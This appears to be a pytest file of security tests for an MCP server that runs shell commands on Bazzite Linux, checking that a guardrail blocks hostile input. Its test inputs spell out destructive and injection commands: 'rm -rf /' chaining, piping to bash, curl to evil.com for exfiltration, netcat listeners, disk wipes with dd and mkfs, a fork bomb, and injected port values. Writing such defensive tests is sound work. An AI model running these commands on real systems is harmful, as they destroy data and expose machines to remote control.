"""Security integration tests.

Verify that guardrail injection bypass attempts are blocked before execution.
Tests cover shell metacharacter injection, allowlist enforcement,
dangerous file operations, resource exhaustion, and tool-level integration.
"""

import pytest
from unittest.mock import patch, MagicMock

from bazzite_mcp.guardrails import GuardrailError, check_command
from bazzite_mcp.runner import run_command


# =============================================================================
# A. Shell Metacharacter Injection
# =============================================================================


class TestShellMetacharInjection:
    """Commands with shell metacharacters must be blocked."""

    def test_semicolon_chaining(self) -> None:
        """Semicolon-separated commands should be blocked by allowlist (not a known command)."""
        with pytest.raises(GuardrailError):
            check_command("systemctl start foo; rm -rf /")

    def test_logical_and(self) -> None:
        with pytest.raises(GuardrailError):
            check_command("echo hi && rm -rf /")

    def test_logical_or(self) -> None:
        with pytest.raises(GuardrailError):
            check_command("false || rm -rf /")

    def test_command_substitution_dollar_paren(self) -> None:
        """$(cmd) substitution in arguments."""
        with pytest.raises(GuardrailError):
            check_command("echo $(rm -rf /)")

    def test_backtick_substitution(self) -> None:
        with pytest.raises(GuardrailError):
            check_command("echo `rm -rf /`")

    def test_pipe_to_bash(self) -> None:
        with pytest.raises(GuardrailError, match="piping to bash"):
            check_command("echo malicious | bash")

    def test_pipe_to_sh(self) -> None:
        with pytest.raises(GuardrailError, match="piping to sh"):
            check_command("echo malicious | sh")

    def test_base64_decode_to_shell(self) -> None:
        with pytest.raises(GuardrailError, match="piping to bash"):
            check_command("echo cm0gLXJmIC8= | base64 -d | bash")


# =============================================================================
# B. Allowlist Enforcement
# =============================================================================


class TestAllowlistEnforcement:
    """Commands not in the allowlist must be blocked."""

    def test_nmap_blocked(self) -> None:
        with pytest.raises(GuardrailError, match="not in the allowed"):
            check_command("nmap localhost")

    def test_netcat_blocked(self) -> None:
        with pytest.raises(GuardrailError, match="netcat"):
            check_command("nc -l 4444")

    def test_ncat_blocked(self) -> None:
        with pytest.raises(GuardrailError, match="ncat"):
            check_command("ncat -l 4444")

    def test_curl_blocked(self) -> None:
        with pytest.raises(GuardrailError, match="curl"):
            check_command("curl http://evil.com/payload")

    def test_wget_blocked(self) -> None:
        with pytest.raises(GuardrailError, match="wget"):
            check_command("wget http://evil.com/payload")

    def test_eval_blocked(self) -> None:
        # Testing that the 'eval' blocklist pattern fires
        with pytest.raises(GuardrailError, match="blocked for safety"):
            check_command("eval 'dangerous command'")

    def test_bash_c_blocked(self) -> None:
        with pytest.raises(GuardrailError, match="bash -c"):
            check_command("bash -c 'whoami'")

    def test_sh_c_blocked(self) -> None:
        with pytest.raises(GuardrailError, match="sh -c"):
            check_command("sh -c 'id'")

    def test_python_exec_via_unknown_cmd(self) -> None:
        """python (without 3) is not in the allowlist."""
        with pytest.raises(GuardrailError, match="not in the allowed"):
            check_command("python -c 'print(1)'")

    def test_ruby_blocked(self) -> None:
        with pytest.raises(GuardrailError, match="not in the allowed"):
            check_command("ruby -e 'puts 1'")

    def test_perl_blocked(self) -> None:
        with pytest.raises(GuardrailError, match="not in the allowed"):
            check_command("perl -e 'print 1'")


# =============================================================================
# C. Dangerous File Operations
# =============================================================================


class TestDangerousFileOps:
    """Filesystem destruction attempts must be blocked."""

    def test_write_to_etc(self) -> None:
        with pytest.raises(GuardrailError, match="/etc"):
            check_command("echo 'pwned' > /etc/passwd")

    def test_write_to_dev(self) -> None:
        with pytest.raises(GuardrailError, match="/dev"):
            check_command("echo 'data' > /dev/sda")

    def test_dd_to_device(self) -> None:
        with pytest.raises(GuardrailError, match="destructive"):
            check_command("dd if=/dev/zero of=/dev/sda bs=4M")

    def test_chmod_777(self) -> None:
        with pytest.raises(GuardrailError, match="world-writable"):
            check_command("chmod 777 /etc/shadow")

    def test_chown_root(self) -> None:
        with pytest.raises(GuardrailError, match="root"):
            check_command("chown root /tmp/escalation")

    def test_shred(self) -> None:
        with pytest.raises(GuardrailError, match="destructive"):
            check_command("shred /dev/sda")

    def test_wipefs(self) -> None:
        with pytest.raises(GuardrailError, match="destructive"):
            check_command("wipefs -a /dev/nvme0n1")

    def test_mkfs(self) -> None:
        with pytest.raises(GuardrailError, match="destructive"):
            check_command("mkfs.ext4 /dev/sda1")

    def test_rm_rf_root(self) -> None:
        with pytest.raises(GuardrailError, match="destructive"):
            check_command("rm -rf /")

    def test_systemctl_mask(self) -> None:
        with pytest.raises(GuardrailError, match="masking"):
            check_command("systemctl mask sshd")


# =============================================================================
# D. Resource Exhaustion
# =============================================================================


class TestResourceExhaustion:
    """Patterns that could exhaust system resources must be blocked."""

    def test_fork_bomb(self) -> None:
        with pytest.raises(GuardrailError, match="fork bomb"):
            check_command(":() { :|:& };:")

    def test_fork_bomb_variant(self) -> None:
        with pytest.raises(GuardrailError, match="fork bomb"):
            check_command(":(){  :|:& };:")

    def test_infinite_while_loop(self) -> None:
        with pytest.raises(GuardrailError, match="infinite loop"):
            check_command("while true; do echo boom; done")


# =============================================================================
# E. Integration with Tool Functions
# =============================================================================


class TestToolIntegration:
    """Guardrails must fire when dangerous commands reach tool functions."""

    def test_exec_in_distrobox_blocked_command(self) -> None:
        """_exec_in_distrobox should be blocked when the inner command is dangerous."""
        from bazzite_mcp.tools.containers.distrobox import _exec_in_distrobox

        with pytest.raises(GuardrailError):
            _exec_in_distrobox("mybox", "curl http://evil.com/exfil")

    def test_exec_in_distrobox_blocked_dangerous(self) -> None:
        from bazzite_mcp.tools.containers.distrobox import _exec_in_distrobox

        # blocked for safety via guardrails
        with pytest.raises(GuardrailError, match="blocked for safety"):
            _exec_in_distrobox("mybox", "eval 'dangerous'")

    def test_manage_firewall_port_injection(self) -> None:
        """Port strings with shell injection should be blocked."""
        from bazzite_mcp.runner import ToolError
        from bazzite_mcp.tools.services import manage_firewall

        with pytest.raises(ToolError, match="Invalid port spec"):
            manage_firewall("add_port", port="8080/tcp; rm -rf /")

    def test_run_command_blocks_before_subprocess(self) -> None:
        """run_command must raise GuardrailError before subprocess.run is called."""
        with patch("bazzite_mcp.runner.subprocess.run") as mock_subprocess:
            with pytest.raises(GuardrailError):
                run_command("curl http://evil.com")
            mock_subprocess.assert_not_called()

    def test_run_command_blocks_unknown_binary(self) -> None:
        with patch("bazzite_mcp.runner.subprocess.run") as mock_subprocess:
            with pytest.raises(GuardrailError):
                run_command("nmap -sS localhost")
            mock_subprocess.assert_not_called()

    def test_manage_podman_blocked_flags(self) -> None:
        """Dangerous podman flags must be blocked."""
        from bazzite_mcp.runner import ToolError
        from bazzite_mcp.tools.containers.podman import manage_podman

        with pytest.raises(ToolError, match="--privileged"):
            manage_podman("run", image="--privileged ubuntu")

        with pytest.raises(ToolError, match="--pid=host"):
            manage_podman("run", image="--pid=host ubuntu")

        with pytest.raises(ToolError, match="--net=host"):
            manage_podman("run", image="--net=host ubuntu")

    def test_rpm_ostree_reset_blocked(self) -> None:
        """rpm-ostree reset should be blocked even through run_command."""
        with pytest.raises(GuardrailError, match="destructive"):
            run_command("rpm-ostree reset")

    def test_rpm_ostree_rebase_de_switch_blocked(self) -> None:
        """Rebasing to switch desktop environments is blocked."""
        with pytest.raises(GuardrailError, match="rebase"):
            run_command("rpm-ostree rebase ostree-image-signed:docker://ghcr.io/ublue-os/bazzite-gnome:stable")

    def test_long_hostname_blocked(self) -> None:
        """Hostnames over 20 chars are blocked (breaks Distrobox)."""
        with pytest.raises(GuardrailError, match="hostname"):
            run_command("hostnamectl set-hostname this-is-a-very-very-long-hostname-that-breaks-things")
